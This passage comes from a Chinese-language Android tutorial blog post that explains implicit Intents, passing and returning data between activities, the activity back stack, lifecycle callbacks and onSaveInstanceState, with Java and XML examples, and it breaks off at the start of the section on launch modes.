class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">"http://www.baidu.com"</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中，Intent.ACTION_VIEW是一个Android系统的内置动作，其常量值为android.intent.action.VIEW。然后通过Uri.parse()方法，将一个网址解析成Uri对象，再调用setData()方法把这个Uri对象传递进去。这样点击按钮后就会弹出浏览器了。</p><p><code>&lt;intent-filter&gt;</code>标签中可以再配置一个<code>&lt;data&gt;</code>标签，用于更精确地指定当前活动能够响应什么类型的数据。<code>&lt;data&gt;</code>标签中主要可以配置以下内容：</p><ul><li>android:scheme：用于指定数据的协议部分。</li><li>android:host：用于指定数据的主机名部分。</li><li>android:port：用于指定数据的端口部分。</li><li>android:path：用于指定主机名和端口之后的部分。</li><li>android:mimeType：用于指定可以处理的数据类型。</li></ul><p>只有<code>&lt;data&gt;</code>标签中指定的内容和Intent中携带的Data完全一致时，当前活动才能够响应该Intent。</p><p>创建ThirdActivity，并添加上button3。然后修改注册信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".ThirdActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.VIEW"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"http"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>重新编译运行，可以看到系统弹出一个列表（未设置默认程序的话），显示了目前能够响应这个Intent的所有程序。</p><p>除了http之外，还可以指定其他很多协议，比如geo的显示地理位置、tel表示拨打电话。</p><p>下面调用系统拨号界面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onClick(View v) &#123;</span><br><span class="line">        Intent intent &#x3D; new Intent(Intent.ACTION_DIAL);</span><br><span class="line">        intent.setData(Uri.parse(&quot;tel:10086&quot;));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="向下一个活动传递数据"><a href="#向下一个活动传递数据" class="headerlink" title="向下一个活动传递数据"></a>向下一个活动传递数据</h3><p>在启动活动时传递数据的思路很简单，Intent中提供了一系列putExtr()方法的重载，可以把我们想要传递的数据暂存在Intent中，启动了另一个活动后，只需要把这些数据再从Intent中取出就可以了。</p><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        String data = <span class="string">"Hello SecondActivity."</span>;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        intent.putExtra(<span class="string">"extra_data"</span>, data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中extra_data是键，data是值。</p><p>然后我们在SecondActivity中将数据取出，并打印出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.second_layout);</span><br><span class="line">    Button button2 = (Button) findViewById(R.id.button_2);</span><br><span class="line">    Intent intent = getIntent();</span><br><span class="line">    String data = intent.getStringExtra(<span class="string">"extra_data"</span>);</span><br><span class="line">    Log.d(<span class="string">"SecondActivity"</span>, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getStringExtra()方法中的String可以切换成相应的数据类型。</p><p>这样就可以在Logcat中看到我们发送的信息了。</p><h3 id="返回数据给上一个活动"><a href="#返回数据给上一个活动" class="headerlink" title="返回数据给上一个活动"></a>返回数据给上一个活动</h3><p>startActivityForResult()方法也是用于启动活动的，但这个方法期望在活动销毁的时候能够返回一个结果给上一个活动。</p><p>startActivityForResult()接收两个参数，第一个参数是Intent，第二个参数是请求码，用于在之后的回调中判断数据的来源。</p><p>修改button1如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        startActivityForResult(intent, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>接下来给button2添加返回数据的逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">button2.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.putExtra(<span class="string">"data_return"</span>, <span class="string">"Hello FirstActivity"</span>);</span><br><span class="line">        setResult(RESULT_OK, intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>setResult()方法用于向上一个活动返回数据。其第一个参数用于向上一个活动返回处理结果，一般只使用RESULT_OK或RESULT_CANCELED这两个值；第二个参数则把带有数据的Intent传递回去。</p><p>然后我们需要在FirstActivity中重写onActivityRsult()方法以得到返回数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(requestCode)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">if</span>(resultCode == RESULT_OK)&#123;</span><br><span class="line">                String returnedData = data.getStringExtra(<span class="string">"data_return"</span>);</span><br><span class="line">                Log.d(<span class="string">"FirstActivity"</span>, returnedData);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>onActivityResult()方法一共有三个参数：第一个参数requestCode是我们启动活动时传入的请求码。第二个参数resultCode，即我们再返回数据时传入的处理结果。第三个参数data，即携带着返回数据的Intent方法。</p><p>这样就完成了向上一个活动传递数据的过程。</p><p>另外如果是通过按下Back键返回的，我们可以重写onBackPressed方法来解决：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBackPressed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent.putExtra(<span class="string">"data_return"</span>, <span class="string">"I back FirstActivity"</span>);</span><br><span class="line">    setResult(RESULT_OK, intent);</span><br><span class="line">    finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="活动的生命周期"><a href="#活动的生命周期" class="headerlink" title="活动的生命周期"></a>活动的生命周期</h2><h3 id="返回栈"><a href="#返回栈" class="headerlink" title="返回栈"></a>返回栈</h3><p>Andorid是使用任务(Task)来管理活动的，一个任务就是一组存放在栈里的活动的集合，这个栈也被称作返回栈。栈是一种后进先出的数据结构，在默认情况下，每当我们启动了一个新的活动，它会在返回栈中入栈，并处于栈顶位置。而每当我们按下Back键或调用finish()方法去销毁一个活动时，处于栈顶的活动就会出栈，这时前一个栈的活动就会重新处于栈顶的位置。系统总是会显示处于栈顶的活动给数据。</p><p><img src="./day2/1.png" alt=""></p><h3 id="活动状态"><a href="#活动状态" class="headerlink" title="活动状态"></a>活动状态</h3><p>每个活动在其生命周期中最多可能会有4中状态：</p><h4 id="运行状态"><a href="#运行状态" class="headerlink" title="运行状态"></a>运行状态</h4><p>当一个活动位于返回栈的栈顶时，这时活动就处于运动状态。</p><h4 id="暂停状态"><a href="#暂停状态" class="headerlink" title="暂停状态"></a>暂停状态</h4><p>当一个活动不再处于栈顶位置，但仍然可见时（比如弹出对话框时他的背景活动仍然是可见的，但它并不是处于栈顶位置），这时活动就进入了暂停状态。只有在内存极低的情况下，系统才会去考虑回收这种活动。</p><h4 id="停止状态"><a href="#停止状态" class="headerlink" title="停止状态"></a>停止状态</h4><p>当一个活动不再处于栈顶位置，并且完全不可见的时候，就进入了停止状态。系统仍然会为这种活动保存相应的状态和成员变量，但这并不是完全可靠的。当其他地方需要内存时，处于停止状态的活动会有可能被系统回收。</p><h4 id="销毁状态"><a href="#销毁状态" class="headerlink" title="销毁状态"></a>销毁状态</h4><p>当一个活动从返回栈中移除后就变成了销毁状态，系统会最倾向于回收处于这种状态的活动。</p><h3 id="活动的生存周期"><a href="#活动的生存周期" class="headerlink" title="活动的生存周期"></a>活动的生存周期</h3><p>Activity类中定义了7个回调方法，覆盖了生命活动周期的每一个环节：</p><ul><li>onCreate()这个方法会在活动第一次被创建的时候调用。在这个活动中应完成初始化操作，比如加载布局、绑定事件等。</li><li>onStart()这个方法在活动由不可见变为可见的时候调用。</li><li>onResume()这个方法在活动准备好和用户进行交互的时候调用，此时的活动一定位于返回栈的栈顶，并且处于运行状态。</li><li>onPause()这个方法在系统准备去启动或者恢复另一个活动的时候调用，我们通常会在这个方法中将一些消耗CPU资源释放掉，以及保存一些关键数据，但这个方法的执行速度一定要快，不然会影响到新的栈顶活动的使用。</li><li>onStop()这个方法在活动完全不可见的时候调用。它和onPause()区别在于如果启动的新活动是一个对话框式的活动，那么onPause()方法会得到执行，而onStop()方法并不会执行。</li><li>onDestory()这个方法在活动被销毁之前调用，之后活动的状态将变为销毁状态。</li><li>onRestart()这个方法在活动由停止状态变为运行状态之前调用，也就是活动被重新启动了。</li></ul><p>从而又可以将活动分为3中周期：</p><ul><li>完整生存期：活动在onCreate()和onDestory()之间所经历的就是完整生存期。一般会在onCreat()中完成各种初始化操作，而在onDestory()中完成释放内存操作。</li><li>可见生存期：活动在onStart()和onStop()之间所经历的就是可见生存期。在可见生存期内，活动对于用户总数可见的，即便有可能无法和用户进行交互。我们可以通过这两个方法，合理地管理那些对用户可见的资源。</li><li>前台生存期：活动在onResume()和onPause()之间所经历的就是前台生存期。在前台生存期内，活动总是处于运行状态，此时活动是可以喝用户进行交互的。</li></ul><h3 id="体验活动的生命周期"><a href="#体验活动的生命周期" class="headerlink" title="体验活动的生命周期"></a>体验活动的生命周期</h3><p>新建一个ActivityLifeCycleTest项目，并且运行Android Studio帮我们自动创建活动和布局，勾选Launcher Activity来讲创建的活动设置为主活动，活动名和布局名都使用默认值。</p><p>然后新建两个子活动——NormalActivity和DialogActivity，其布局名分别为normal_layout和dialog_layout。</p><p>修改normal_layout.xml为如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".NormalActivity"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:text</span>=<span class="string">"This is a normal activity"</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改dialog_layout.xml文件为如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".DialogActivity"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:text</span>=<span class="string">"This is a dialog activity"</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改AndroidMainFest.xml的<code>&lt;activity&gt;</code>标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".DialogActivity"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:theme</span>=<span class="string">"@style/Theme.AppCompat.Dialog"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".NormalActivity"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>这里@android:stylt/Theme.Dialog是用来指定为对话框式的主体。</p><p>接下来修改activity_main.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_normal_activity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start NormalActivity"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_dialog_activity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start DialogActivity"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后，修改MainActivity代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"MainACtivity"</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        </span><br><span class="line">        Button startNormalActivity = (Button) findViewById(R.id.start_normal_activity);</span><br><span class="line">        </span><br><span class="line">        Button startDialogActivity = (Button) findViewById(R.id.start_dialog_activity);</span><br><span class="line">        </span><br><span class="line">        startNormalActivity.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View V)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, NormalActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        startDialogActivity.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View V)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, DialogActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStart();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onStart"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onResume();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onResume"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onPause();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onPause"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStop();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onStop"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onDestroy"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRestart</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onRestart();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onRestart"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行后，便可以体验一遍生命周期了。</p><h3 id="活动被回收后"><a href="#活动被回收后" class="headerlink" title="活动被回收后"></a>活动被回收后</h3><p>当A去启动B 后，A被回收了，而B按下back键返回A时，还是会正常显示A，但是这时并不会执行onRestrat()，而是执行onCreate()，因为活动A在这种情况下会被重新创建一次。</p><p>但是这种情况下A的临时数据和状态会丢失，Activity提供了onSaveInstanceState()回调方法，这个方法可以保证在活动被回收之前一定会被调用，因此我们可以通过这个方法来解决活动被回收时临时数据得不到保存的问题。</p><p>onSaveInstanceState()会携带一个Bundle类型的参数，Bundle提供了一系列的方法保存数据，比如可以用putString()方法保存字符串，putInt保存整型数据等。每个保存方法需要传入两个参数，分别是键和值。</p><p>在MainActivity中添加如下代码就可以将临时数据进行保存：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onSaveInstanceState</span><span class="params">(Bundle outState)</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onSaveInstanceState(outState);</span><br><span class="line">    String tempData = <span class="string">"Something you just typed"</span>;</span><br><span class="line">    outState.putString(<span class="string">"data_key"</span>, tempData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时，在onCreate中也有一个Bundle类型的参数，该参数在一般情况下为null，但如果在活动被系统回收之前有同过onSaveInstanceState()来保存数据的话，这个参数就会带有之前所保存的全部数据，我们只需要通过相应的取值方法将数据取出即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    Log.d(TAG, &quot;onCreate&quot;);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">if(savedInstanceState !&#x3D; null)&#123;</span><br><span class="line">String tempData &#x3D; savedInstanceState.getString(&quot;data_key&quot;);</span><br><span class="line">Log.d(TAG, tempData);</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="活动的启动模式"><a href="#活动的启动模式" class="headerlink" title="活动的启动模式"></a>活动的启动模式</h2><p>启动模式一共有四种，分别是standard、singleTop、singleTask和singleInstance，可以在<code>&lt;activity&gt;</code>标签指定android:launchMode属性来选择启动模式。</p><h3 